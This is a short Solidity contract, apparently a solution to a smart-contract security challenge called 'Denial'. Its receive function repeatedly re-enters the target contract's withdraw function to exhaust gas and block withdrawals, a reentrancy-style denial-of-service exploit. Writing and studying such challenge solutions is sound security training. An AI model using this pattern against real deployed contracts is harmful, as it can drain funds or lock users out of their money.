// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    //Code me!
    receive() external payable {
        if (address(contractAddress).balance > 0 && gasleft() <= 1e6) {
            Denial denialContract = Denial(contractAddress);
            denialContract.withdraw();
        }
    }
}
